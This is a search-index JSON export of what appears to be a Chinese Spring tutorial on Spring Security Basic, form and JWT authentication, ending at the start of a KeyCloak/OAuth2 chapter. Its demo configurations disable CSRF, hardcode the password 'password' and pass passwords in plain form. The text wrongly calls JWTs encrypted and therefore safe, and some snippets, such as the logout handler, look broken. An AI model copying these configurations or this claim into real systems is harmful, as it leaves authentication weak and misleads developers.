\uff0c\u5982\u679c\u627e\u5230\u4e86\uff0c\u5c31\u7528\u8fd9\u4e2a\u7528\u6237\u540d\u548c\u5bc6\u7801\u8fdb\u884c\u8ba4\u8bc1\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5c31\u4f1a\u751f\u6210\u4e00\u4e2a\u5bc6\u7801\uff0c\u6253\u5370\u5728\u63a7\u5236\u53f0\u4e0a\uff0c\u7136\u540e\u7528\u8fd9\u4e2a\u5bc6\u7801\u8fdb\u884c\u8ba4\u8bc1\u3002\u8fd9\u4e2a\u5bc6\u7801\u662f\u968f\u673a\u7684\uff0c\u6bcf\u6b21\u542f\u52a8\u90fd\u4e0d\u4e00\u6837\u3002\u7528\u6237\u540d\u662f user \u3002","title":"Spring Security \u8ba4\u8bc1\u4e0e\u9274\u6743\u6d41\u7a0b"},{"location":"14/#spring-security-basic","text":"\u9996\u5148\uff0c\u6211\u4eec\u8981\u914d\u7f6e\u597d UserDetailsService\uff0c\u5b83\u7528\u4e8e\u6839\u636e\u7528\u6237\u540d\u67e5\u8be2\u7528\u6237\u4fe1\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u4e0d\u8fde\u63a5\u6570\u636e\u5e93\u4e86\uff0c\u800c\u662f\u76f4\u63a5\u7528 Map \u5b58\u50a8\u7528\u6237\u4fe1\u606f\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528\u9ed8\u8ba4\u7c7b\u3002\u6ce8\u610f\uff0c\u975e WebFlux \u7248\u672c\u6ca1\u6709 MapUserDetailsManager \uff0c\u9700\u8981\u81ea\u5df1\u5b9e\u73b0\u3002 @Bean PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); } @Bean public ReactiveUserDetailsService reactiveUserDetailsService( @Autowired PasswordEncoder passwordEncoder ) { return new MapReactiveUserDetailsService( User.withUsername(\"user\") .password(passwordEncoder.encode(\"password\")) .roles(\"USER\") .build(), User.withUsername(\"admin\") .password(passwordEncoder.encode(\"password\")) .roles(\"ADMIN\") .build() ); } \u7136\u540e\u914d\u7f6e Filter\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u8fd9\u91cc\u7684\u914d\u7f6e\u5f88\u7b80\u5355\uff0c .httpBasic(Customizer.withDefaults()) \u8868\u793a\u4f7f\u7528 HTTP Basic \u8ba4\u8bc1\uff1b .authorizeExchange(exchanges -> exchanges... \u8868\u793a\u914d\u7f6e\u9274\u6743\u89c4\u5219\uff1b .csrf(csrf -> csrf.disable()) \u8868\u793a\u5173\u95ed CSRF \u9632\u62a4\uff1b .cors(Customizer.withDefaults()) \u8868\u793a\u914d\u7f6e CORS \u89c4\u5219\u3002 \u5176\u4e2d\uff0c pathMatchers \u8868\u793a\u5339\u914d\u8def\u5f84\uff0c permitAll \u8868\u793a\u5141\u8bb8\u6240\u6709\u7528\u6237\u8bbf\u95ee\uff0c authenticated \u8868\u793a\u53ea\u5141\u8bb8\u8ba4\u8bc1\u7528\u6237\u8bbf\u95ee\uff0c hasRole \u8868\u793a\u53ea\u5141\u8bb8\u6709\u67d0\u4e2a\u89d2\u8272\u7684\u7528\u6237\u8bbf\u95ee\u3002 \u8fd9\u91cc\u7684 Role \u5339\u914d\u5176\u5b9e\u5c31\u662f GrantedAuthority \u5339\u914d\uff0c\u53ea\u4e0d\u8fc7 Spring Security \u4e3a\u4e86\u65b9\u4fbf\uff0c\u63d0\u4f9b\u4e86 hasRole \u65b9\u6cd5\uff0c\u5b83\u4f1a\u81ea\u52a8\u52a0\u4e0a ROLE_ \u524d\u7f00\u3002\u7b80\u5355\u6765\u8bf4\uff0c\u4e3a\u4e00\u4e2a\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a\u89d2\u8272\uff0c\u5c31\u662f\u4e3a\u8fd9\u4e2a\u7528\u6237\u6dfb\u52a0\u4e00\u4e2a GrantedAuthority \uff0c\u8fd9\u4e2a GrantedAuthority \u7684 getAuthority \u65b9\u6cd5\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u5c31\u662f ROLE_ \u52a0\u4e0a\u89d2\u8272\u540d\u3002\u68c0\u67e5\u4e5f\u662f\u4e00\u6837\u7684\uff0c\u53ea\u8981\u7528\u6237\u7684 Authorities \u4e2d\u5305\u542b\u8fd9\u4e2a GrantedAuthority \uff0c\u5c31\u53ef\u4ee5\u8bbf\u95ee\u3002 \u6b64\u5916\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528 access \u8868\u8fbe\u5f0f\uff0c\u5b83\u662f\u4e00\u4e2a SpEL \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u3002\u91cc\u9762\u7684\u5185\u5bb9\u5c31\u662f\u6b63\u5e38\u60c5\u51b5\u4e0b\u7684\u6743\u9650\u63a7\u5236\u65b9\u6cd5\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").access(\"permitAll()\") .pathMatchers(\"/resource/private\").access(\"isAuthenticated()\") .pathMatchers(\"/resource/admin\").access(\"hasRole('ADMIN')\") ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u6216\u8005\u4f7f\u7528\u57fa\u4e8e\u6ce8\u89e3\u7684\u65b9\u5f0f\u3002 @GetMapping(\"/private\") @PreAuthorize(\"isAuthenticated()\") public Mono<String> privateResource() { return Mono.just(\"Private resource\"); } \u8fd9\u91cc\u7684 @PreAuthorize \u662f\u4e00\u4e2a\u6ce8\u89e3\uff0c\u5b83\u7684\u503c\u662f\u4e00\u4e2a SpEL \u8868\u8fbe\u5f0f\uff0c\u7528\u4e8e\u5224\u65ad\u7528\u6237\u662f\u5426\u6709\u6743\u9650\u8bbf\u95ee\u8fd9\u4e2a\u63a5\u53e3\u3002\u91cc\u9762\u7684\u5185\u5bb9\u548c access \u65b9\u6cd5\u4e00\u81f4\u3002 \u5982\u679c\u4f7f\u7528\u4e86 Spring Doc\uff0c\u5148\u52a0\u4e0a @SecurityRequirement \u6ce8\u89e3\uff0c @GetMapping(\"/private\") @SecurityRequirement(name = \"basicAuth\") public Mono<String> privateResource() { return Mono.just(\"Private resource\"); } @GetMapping(\"/admin\") @SecurityRequirement(name = \"basicAuth\", scopes = \"admin\") public Mono<String> adminResource() { return Mono.just(\"Admin resource\"); } \u7136\u540e\u52a0\u4e0a @SecurityScheme \u6ce8\u89e3\uff0c package io.github.fingerbone; import org.springframework.context.annotation.Configuration; import io.swagger.v3.oas.annotations.enums.SecuritySchemeType; import io.swagger.v3.oas.annotations.security.SecurityScheme; @Configuration @SecurityScheme( name = \"basicAuth\", type = SecuritySchemeType.HTTP, scheme = \"basic\" ) public class SpringDocConfig { } \u8fd9\u6837 Swagger \u5c31\u4f1a\u81ea\u52a8\u52a0\u4e0a\u8ba4\u8bc1\u4fe1\u606f\u3002\u6bcf\u4e2a\u6709 Security \u6ce8\u89e3\u7684\u63a5\u53e3\u90fd\u4f1a\u6709\u4e00\u4e2a\u9501\u7684\u56fe\u6807\uff0c\u70b9\u51fb\u540e\u4f1a\u5f39\u51fa\u8ba4\u8bc1\u6846\uff0c\u8f93\u5165\u7528\u6237\u540d\u5bc6\u7801\u5373\u53ef\u3002 \u6ce8\u610f\uff0c\u9ed8\u8ba4 HTTP Basic \u662f\u6709 Cookie \u4fdd\u6301\u7684\u3002 \u8fdb\u5165\u6d4f\u89c8\u5668\u7684\u5f00\u53d1\u8005\u5de5\u5177\uff0c\u9009\u62e9 Storage\u3002\u5728 All Storage \u91cc\u5220\u6389\u6240\u6709 Cookie \u5373\u53ef\u3002 \u5f53\u7136\uff0c\u66f4\u597d\u7684\u65b9\u6cd5\u662f\u6dfb\u52a0\u4e00\u4e2a\u767b\u51fa\u63a5\u53e3\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5728\u6d4f\u89c8\u5668\u4e2d\u767b\u51fa\u4e86\u3002 @GetMapping(\"/logout\") public Mono<Void> logout(ServerWebExchange exchange) { return exchange.getPrincipal().flatMap(principal -> { if (principal instanceof Authentication) { return exchange.getExchange().getSession().doOnNext(WebSession::invalidate); } return Mono.empty(); }); } \u6216\u8005\u76f4\u63a5\u7528 Spring Security \u63d0\u4f9b\u7684 LogoutWebFilter \u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .logout(logout -> logout.logoutUrl(\"/logout\")) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u8fd9\u6837\uff0c\u8bbf\u95ee /logout \u5c31\u4f1a\u767b\u51fa\u3002 \u5982\u679c\u8981\u5173\u95ed Cookie\uff0c\u53ef\u4ee5\u4f7f\u7528 securityContextRepository \uff0c\u8fd9\u4e2a\u7c7b\u7528\u4e8e\u5b58\u50a8 SecurityContext \u3002\u9ed8\u8ba4\u7684\u5b9e\u73b0\u662f WebSessionServerSecurityContextRepository \uff0c\u5b83\u4f1a\u628a SecurityContext \u5b58\u50a8\u5230 WebSession \u4e2d\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 NoOpServerSecurityContextRepository \uff0c\u5b83\u4e0d\u4f1a\u5b58\u50a8 SecurityContext \u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .logout(logout -> logout.logoutUrl(\"/logout\")) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u5982\u679c\u4f7f\u7528 Servlet \u7248\u672c\uff0c\u4f7f\u7528\u7684\u662f sessionManagement \u3002 @Bean public SecurityFilterChain securityFilterChain( HttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .logout(logout -> logout.logoutUrl(\"/logout\")) .sessionManagement(sessionManagement -> sessionManagement .sessionCreationPolicy(SessionCreationPolicy.STATELESS) ) .authorizeRequests(authorizeRequests -> authorizeRequests .antMatchers(\"/resource/public\").permitAll() .antMatchers(\"/resource/private\").authenticated() .antMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyRequest().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); } \u8fd9\u6837\uff0c\u5c31\u5173\u95ed\u4e86 Cookie\u3002","title":"\u914d\u7f6e Spring Security \u8fdb\u884c Basic \u8ba4\u8bc1\u4e0e\u9274\u6743"},{"location":"14/#spring-security_3","text":"\u8868\u5355\u8ba4\u8bc1\u4e0e Basic \u8ba4\u8bc1\u7c7b\u4f3c\uff0c\u53ea\u662f\u8ba4\u8bc1\u65b9\u5f0f\u4e0d\u540c\u3002\u53ea\u9700\u8981\u5c06 .httpBasic(Customizer.withDefaults()) \u66ff\u6362\u6210 .formLogin(Customizer.withDefaults()) \u5373\u53ef\u3002\u5982\u679c\u4e24\u8005\u90fd\u6709\uff0c\u90a3\u4e48\u662f\u6216\u7684\u5173\u7cfb\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http ) { return http .httpBasic(Customizer.withDefaults()) .formLogin(Customizer.withDefaults()) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .build(); }","title":"\u914d\u7f6e Spring Security \u8fdb\u884c\u8868\u5355\u8ba4\u8bc1\u4e0e\u9274\u6743"},{"location":"14/#spring-security-jwt","text":"","title":"\u914d\u7f6e Spring Security \u8fdb\u884c JWT \u8ba4\u8bc1\u4e0e\u9274\u6743"},{"location":"14/#jwt","text":"JWT \u4f7f\u7528 Bearer Token \u8ba4\u8bc1\uff0c\u5b83\u7684\u683c\u5f0f\u662f Bearer token \uff0c\u5176\u4e2d token \u662f Token \u7684\u5185\u5bb9\u3002Token \u7684\u5185\u5bb9\u662f\u4e00\u4e2a JSON \u5bf9\u8c61\uff0c\u5b83\u5305\u542b\u4e86\u7528\u6237\u7684\u4fe1\u606f\uff0c\u5982\u7528\u6237\u540d\u3001\u6743\u9650\u7b49\u3002Token \u662f\u52a0\u5bc6\u7684\uff0c\u56e0\u6b64\u662f\u5b89\u5168\u7684\u3002 \u5176\u4e2d\uff0c\u5177\u4f53\u800c\u8a00\uff0c\u4e00\u4e2a JWT Token \u7531\u4e09\u90e8\u5206\u7ec4\u6210\uff0c\u5206\u522b\u662f Header\u3001Payload \u548c Signature\u3002Header \u5305\u542b\u4e86 Token \u7684\u7c7b\u578b\u548c\u52a0\u5bc6\u7b97\u6cd5\uff1bPayload \u5305\u542b\u4e86\u7528\u6237\u7684\u4fe1\u606f\uff1bSignature \u662f Header \u548c Payload \u7684\u7b7e\u540d\uff0c\u7528\u4e8e\u9a8c\u8bc1 Token \u7684\u5b8c\u6574\u6027\u3002\u4e09\u8005\u4e4b\u95f4\u7528 . \u5206\u9694\u3002JWT Token \u7531\u670d\u52a1\u5668\u8d1f\u8d23\u751f\u6210\uff0c\u5ba2\u6237\u7aef\u8d1f\u8d23\u4fdd\u5b58\u3002 \u4f8b\u5982\uff0c\u4e00\u4e2a JWT Token \u89e3\u5bc6\u540e\u7684\u5185\u5bb9\u53ef\u80fd\u662f\u8fd9\u6837\u7684\uff0c { \"header\": { \"alg\": \"HS256\", \"typ\": \"JWT\" }, \"payload\": { \"sub\": \"user\", \"roles\": [\"USER\"] }, \"signature\": \"...\" } JWT \u4e2d\u4e00\u5b9a\u4e0d\u8981\u5b58\u50a8\u654f\u611f\u4fe1\u606f\uff0c\u56e0\u4e3a JWT \u672c\u8eab\u662f\u660e\u6587\u7684\u3002 Payload \u4e2d\uff0c\u6709\u4e00\u4e9b\u5b57\u6bb5\u662f JWT \u89c4\u5b9a\u7684\uff0c\u5982 sub \u8868\u793a\u7528\u6237\uff0c exp \u8868\u793a\u8fc7\u671f\u65f6\u95f4\uff0c iat \u8868\u793a\u7b7e\u53d1\u65f6\u95f4\u7b49\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u53ef\u4ee5\u81ea\u5b9a\u4e49\u5b57\u6bb5\uff0c\u5982 roles \u8868\u793a\u7528\u6237\u7684\u89d2\u8272\u3002\u6bcf\u4e00\u6761\u8bb0\u5f55\u79f0\u4e3a\u4e00\u4e2a Claim\uff0c\u56e0\u6b64 Payload \u6709\u65f6\u4e5f\u53eb Claims\u3002","title":"JWT \u8ba4\u8bc1\u539f\u7406"},{"location":"14/#jwt_1","text":"JWT \u4e00\u822c\u4f7f\u7528\u4e00\u4e2a\u8f7b\u91cf\u7ea7\u7684 JJWT \u5e93\u8fdb\u884c\u89e3\u6790\u3002\u7b7e\u53d1 Token \u65f6\uff0c\u9700\u8981\u6307\u5b9a Token \u7684\u8fc7\u671f\u65f6\u95f4\u3001\u7b7e\u53d1\u65f6\u95f4\u3001\u7528\u6237\u4fe1\u606f\u7b49\u3002\u89e3\u7801 Token \u65f6\uff0c\u9700\u8981\u6307\u5b9a Token \u7684\u7b7e\u540d\u5bc6\u94a5\u3002 \u9996\u5148\u5f15\u5165\u4f9d\u8d56\uff0c dependencies { implementation 'io.jsonwebtoken:jjwt-api:0.12.6' runtimeOnly 'io.jsonwebtoken:jjwt-jackson:0.12.6' runtimeOnly 'io.jsonwebtoken:jjwt-impl:0.12.6' } \u7136\u540e\u5b9e\u73b0\u4e00\u4e2a Util \u7c7b\u3002 import java.util.*; import javax.crypto.SecretKey; import org.springframework.beans.factory.annotation.Value; import org.springframework.security.core.Authentication; import org.springframework.security.core.GrantedAuthority; import org.springframework.security.core.userdetails.ReactiveUserDetailsService; import org.springframework.security.core.userdetails.UserDetails; import org.springframework.security.core.userdetails.UserDetailsService; import org.springframework.stereotype.Component; import io.jsonwebtoken.Claims; import io.jsonwebtoken.Jws; import io.jsonwebtoken.Jwts; @Component public class JwtUtil { private final ReactiveUserDetailsService userDetailsService; @Value(\"#{${jwt.expiration-seconds}}\") private final Integer expirationSeconds; private final SecretKey key; public JwtUtil(ReactiveUserDetailsService userDetailsService, @Value(\"${jwt.expiration-seconds}\") Integer expirationSeconds) { this.userDetailsService = userDetailsService; this.expirationSeconds = expirationSeconds; this.key = Jwts.SIG.HS256.key().build(); } public String generateToken(String username) { UserDetails userDetails = userDetailsService.findByUsername(username).block(); Date expire = new Date(System.currentTimeMillis() + expirationSeconds * 1000); String id = UUID.randomUUID().toString(); return Jwts.builder() .header() .add(\"typ\", \"JWT\") .add(\"alg\", \"HS256\") .and() .claim(\"username\", userDetails.getUsername()) .claim(\"authorities\", userDetails.getAuthorities()) .id(id) .expiration(expire) .issuedAt(new Date()) .subject(userDetails.getUsername()) .issuer(\"issuer\") .signWith( key, Jwts.SIG.HS256 ) .compact(); } public Jws<Claims> parseToken(String token) { return Jwts.parser().verifyWith(key).build().parseSignedClaims( token ); } public Authentication parseToAuthentication(String token) { Jws<Claims> jws = parseToken(token); UserDetails userDetails = userDetailsService.findByUsername(jws.getPayload().getSubject()).block(); return new Authentication() { private static final long serialVersionUID = 1L; @Override public String getName() { return userDetails.getUsername(); } @Override public Collection<? extends GrantedAuthority> getAuthorities() { return userDetails.getAuthorities(); } @Override public Object getCredentials() { return userDetails.getPassword(); } @Override public Object getDetails() { return userDetails; } @Override public Object getPrincipal() { return userDetails; } @Override public boolean isAuthenticated() { return true; } @Override public void setAuthenticated(boolean isAuthenticated) throws IllegalArgumentException { throw new UnsupportedOperationException(); } }; } } \u6ce8\u610f\uff0c\u5982\u679c\u4f7f\u7528\u7684 Servlet \u7684 UserDetailsService\uff0c\u4f7f\u7528 loadUserDetails \u65b9\u6cd5\u3002\u8fd9\u91cc\u90fd\u662f\u4e00\u4e9b\u7b80\u5355\u7684\u6784\u9020\u5668\u65b9\u6cd5\u4f7f\u7528\uff0c\u4e0d\u518d\u8d58\u8ff0\u3002","title":"JWT \u7684\u89e3\u6790"},{"location":"14/#jwt_2","text":"\u4f7f\u7528\u4e00\u4e2a\u7b80\u5355\u7684 API \u8fdb\u884c\u7b7e\u53d1\u5373\u53ef\u3002\u5982\u679c\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u4f7f\u7528 HTTPS\uff0c\u8981\u4e48\u4f7f\u7528\u975e\u5bf9\u79f0\u52a0\u5bc6\u8fdb\u884c\u5bc6\u7801\u4f20\u9012\u3002\u4f46\u8fd9\u91cc\u4e3a\u4e86\u6f14\u793a\uff0c\u5c31\u76f4\u63a5\u4f20\u9012\u5bc6\u7801\u4e86\u3002 @RestController @RequestMapping(\"/resource\") @RequiredArgsConstructor public class MainController { JwtUtil jwtUtil; ReactiveUserDetailsService userDetailsService; PasswordEncoder passwordEncoder; @PostMapping(\"/login\") public Mono<String> login(@RequestParam String username, @RequestParam String password) { return userDetailsService.findByUsername(username) .filter(userDetails -> passwordEncoder.matches(password, userDetails.getPassword())) .map(userDetails -> jwtUtil.generateToken(username)) .switchIfEmpty(Mono.error(new Exception(\"Authentication failed\"))); } }","title":"JWT \u7684\u7b7e\u53d1"},{"location":"14/#jwt_3","text":"\u6839\u636e\u524d\u6587\uff0c\u6211\u4eec\u77e5\u9053\uff0cWebFilter \u8d1f\u8d23\u751f\u4ea7 Authentication \u5bf9\u8c61\uff0c\u800c AuthenticationManager \u8d1f\u8d23\u9a8c\u8bc1 Authentication \u5bf9\u8c61\u3002 \u56e0\u6b64\uff0c\u9996\u5148\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a WebFilter \u7528\u6765\u89e3\u6790 Token\u3002\u8fd9\u4e2a WebFilter \u90fd\u662f\u4f7f\u7528 AuthenticationWebFilter\uff0c\u5305\u542b\u4e86\u82e5\u5e72\u56de\u8c03\u51fd\u6570\u3002\u8fd9\u91cc\u6211\u4eec\u8986\u5199 Convert \u5373\u53ef\u3002 \u6ce8\u610f\uff0c\u8fd9\u4e2a\u7c7b\u9700\u8981\u4e00\u4e2a AuthenticationManager\u3002\u4f46\u56e0\u4e3a JWT \u7684\u89e3\u6790\u8fc7\u7a0b\u5c31\u662f\u9a8c\u8bc1\u8fc7\u7a0b\uff0c\u56e0\u6b64\u8fd9\u4e2a AuthenticationManager \u4e0d\u9700\u8981\u505a\u4efb\u4f55\u64cd\u4f5c\u3002 ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() { @Override public Mono<Authentication> authenticate(Authentication authentication) { if(authentication.isAuthenticated()) { return Mono.just(authentication); } else { return Mono.empty(); } } }; AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager); filter.setServerAuthenticationConverter( exchange -> { String token = exchange.getRequest().getHeaders().getFirst(\"Authorization\"); if (token != null && token.startsWith(\"Bearer \")) { token = token.substring(7); Authentication authentication = jwtUtil.parseToAuthentication(token); return Mono.just(authentication); } return Mono.empty(); } ); \u7136\u540e\u6211\u4eec\u628a\u5b83\u4eec\u52a0\u5230 SecurityFilterChain \u4e2d\u3002 @Bean public SecurityWebFilterChain securityWebFilterChain( ServerHttpSecurity http, @Autowired JwtUtil jwtUtil ) { ReactiveAuthenticationManager authenticationManager = new ReactiveAuthenticationManager() { @Override public Mono<Authentication> authenticate(Authentication authentication) { if(authentication.isAuthenticated()) { return Mono.just(authentication); } else { return Mono.empty(); } } }; AuthenticationWebFilter filter = new AuthenticationWebFilter(authenticationManager); filter.setServerAuthenticationConverter( exchange -> { String token = exchange.getRequest().getHeaders().getFirst(\"Authorization\"); if (token != null && token.startsWith(\"Bearer \")) { token = token.substring(7); Authentication authentication = jwtUtil.parseToAuthentication(token); return Mono.just(authentication); } return Mono.empty(); } ); SecurityWebFilterChain chain = http .httpBasic(basic -> basic.disable()) .formLogin(form -> form.disable()) .logout(logout -> logout.disable()) .addFilterBefore(filter, SecurityWebFiltersOrder.AUTHENTICATION) .authorizeExchange(exchanges -> exchanges .pathMatchers(\"/resource/public\").permitAll() .pathMatchers(\"/resource/private\").authenticated() .pathMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyExchange().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .securityContextRepository( NoOpServerSecurityContextRepository.getInstance() ) .build(); return chain; } \u5982\u679c\u662f\u4f7f\u7528\u7684 Servlet \u7248\u672c\uff0c\u6709\u4e00\u70b9\u70b9\u4e0d\u540c\u3002\u5177\u4f53\u800c\u8a00\uff0c\u521b\u5efa AuthenticationFilter \u65f6\u9700\u8981\u4e00\u5e76\u4f20\u5165 AuthenticationConverter\u3002\u5728\u6dfb\u52a0 Filter \u65f6\u8981\u4f7f\u7528\u7c7b\u540d\u3002 \u4ee3\u7801\u5982\u4e0b\uff0c @Bean public SecurityFilterChain securityFilterChain( HttpSecurity http, @Autowired JwtUtil jwtUtil ) { AuthenticationManager authenticationManager = new AuthenticationManager() { @Override public Authentication authenticate(Authentication authentication) throws AuthenticationException { if(authentication.isAuthenticated()) { return authentication; } else { throw new BadCredentialsException(\"Bad credentials\"); } } }; AuthenticationConverter converter = new AuthenticationConverter() { @Override public Authentication convert(HttpServletRequest request) { String token = request.getHeader(\"Authorization\"); if (token != null && token.startsWith(\"Bearer \")) { token = token.substring(7); Authentication authentication = jwtUtil.parseToAuthentication(token); return authentication; } return null; } }; AuthenticationFilter filter = new AuthenticationFilter(authenticationManager, converter); SecurityFilterChain chain = http .httpBasic(basic -> basic.disable()) .formLogin(form -> form.disable()) .logout(logout -> logout.disable()) .addFilterBefore(filter, UsernamePasswordAuthenticationFilter.class) .authorizeRequests(authorizeRequests -> authorizeRequests .antMatchers(\"/resource/public\").permitAll() .antMatchers(\"/resource/private\").authenticated() .antMatchers(\"/resource/admin\").hasRole(\"ADMIN\") .anyRequest().permitAll() ) .csrf(csrf -> csrf.disable()) .cors(Customizer.withDefaults()) .build(); return chain; } \u5982\u679c\u4f7f\u7528\u4e86 SpringDoc\uff0c\u628a\u8ba4\u8bc1\u6a21\u5f0f\u5207\u6362\u4e3a bearerAuth \u5373\u53ef\u3002 @GetMapping(\"/private\") @SecurityRequirement(name = \"bearerAuth\") public Mono<String> privateResource() { return Mono.just(\"Private resource\"); } @Configuration @SecurityScheme( name = \"bearerAuth\", type = SecuritySchemeType.HTTP, scheme = \"bearer\" ) class SpringDocConfig {} \u7efc\u4e0a\uff0c\u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86 JWT \u8ba4\u8bc1\u4e0e\u9274\u6743\u3002\u901a\u8fc7\u8fd9\u4e2a\u4f8b\u5b50\uff0c\u6211\u4eec\u4e5f\u66f4\u597d\u5730\u7406\u89e3\u4e86 Spring Security \u7684\u8ba4\u8bc1\u4e0e\u9274\u6743\u6d41\u7a0b\u3002 \u4ee5\u53ca\uff0c\u7f51\u4e0a\u5f88\u591a\u6559\u7a0b\u90fd\u662f\u81ea\u5df1\u5199\u4e00\u4e2a Filter\uff0c\u7136\u540e\u5728 Filter \u91cc\u9762\u5199\u8ba4\u8bc1\u903b\u8f91\uff0c\u8fd9\u6837\u6839\u672c\u5c31\u6ca1\u8fc7 Spring Security \u7684\u8ba4\u8bc1\u6d41\u7a0b\uff0c\u8fd9\u6837\u505a\u662f\u4e0d\u5bf9\u7684\u3002\u672c\u6587\u7684\u5199\u6cd5\u624d\u662f\u6b63\u786e\u7684\u3002\u5f53\u7136\uff0c\u8fd9\u4e2a\u4e5f\u53ef\u80fd\u56e0\u4e3a Spring Security \u7684\u6587\u6863\u6ca1\u660e\u786e\u5199\u8fd9\u70b9\u3002\u4e0d\u8fc7\u5927\u90e8\u5206\u4eba\u786e\u5b9e\u6ca1\u6709\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u65b9\u6cd5\u7684\u9700\u6c42\u3002 Spring Security \u5185\u7f6e\u7684 JWT \u662f\u57fa\u4e8e OAuth2 \u8ba4\u8bc1\u6846\u67b6\u7684\uff0c\u6bd4\u8f83\u590d\u6742\uff0c\u5728\u4e0b\u4e00\u90e8\u5206\u4ecb\u7ecd\u3002","title":"JWT \u7684\u9a8c\u8bc1"},{"location":"15/","text":"Spring \u901f\u6210 Ch15 Spring Security \u4e0e KeyCloak \u4e0a\u6b21\u4ecb\u7ecd\u4e86\u5355\u4f53\u5e94\u7528\u4f7f\u7528 Spring Security \u7684\u57fa\u672c\u914d\u7f6e\uff0c\u8fd9\u6b21\u8bb2\u89e3 OAuth2 \u6846\u67b6\u7684\u4f7f\u7528\u3002 OAuth2 \u53ea\u662f\u4e00\u5957\u6388\u6743\u6846\u67b6\uff0c\u4e0d\u5305\u542b\u8ba4\u8bc1\u529f\u80fd\u3002Spring Security \u4e3a OAuth2 \u63d0\u4f9b\u4e86\u652f\u6301\uff0c\u53ef\u4ee5\u5f88\u65b9\u4fbf\u5730\u5b9e\u73b0 OAuth2 \u7684\u8ba4\u8bc1\u4e0e\u9274\u6743\u3002\u5176\u5b83\u8bed\u8a00\u4e5f\u6709 OAuth2 \u6846\u67b6\u3002\u4f8b\u5982\uff0cPython \u6709 authlib \uff0cGo \u6709 golang.org/x/oauth2 \u3002 \u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 KeyCloak \u4f5c\u4e3a\u6388\u6743\u670d\u52a1\u5668\uff0cKeyCloak \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u89e3\u51b3\u65b9\u6848\u3002KeyCloak \u4e3a OAuth2 \u548c OIDC \u63d0\u4f9b\u4e86\u652f\u6301\u3002OIDC \u662f OAuth2 \u7684\u4e00\u4e2a\u6269\u5c55\uff0c\u4e3a OAuth2 \u6dfb\u52a0\u4e86\u7528\u6237\u4fe1\u606f\u7684\u83b7\u53d6\uff0c\u5e76\u589e\u5f3a\u4e86\u5b89\u5168\u6027\u3002 OAuth2 OAuth2 \u662f\u4e00\u4e2a\u5f00\u653e\u6807\u51c6\uff0c\u5141\u8bb8\u7528\u6237\u6388\u6743\u7b2c\u4e09\u65b9\u5e94\u7528\u8bbf\u95ee\u4ed6\u4eec\u5b58\u50a8\u5728\u53e6\u5916\u7684\u670d\u52a1\u63d0\u4f9b\u8005\u4e0a\u7684\u4fe1\u606f\uff0c\u800c\u4e0d\u9700\u8981\u5c06\u7528\u6237\u540d\u548c\u5bc6\u7801\u63d0\u4f9b\u7ed9\u7b2c\u4e09\u65b9\u5e94\u7528\u3002OAuth2 \u4e3a\u7528\u6237\u8d44\u6e90\u7684\u6388\u6743\u63d0\u4f9b\u4e86\u4e00\u4e2a\u5b89\u5168\u7684\u3001\u5f00\u653e\u548c\u7b80\u5355\u7684\u6807\u51c6\u3002\u8fd9\u4e2a\u6807\u51c6\u7684\u6587\u6863\u5728 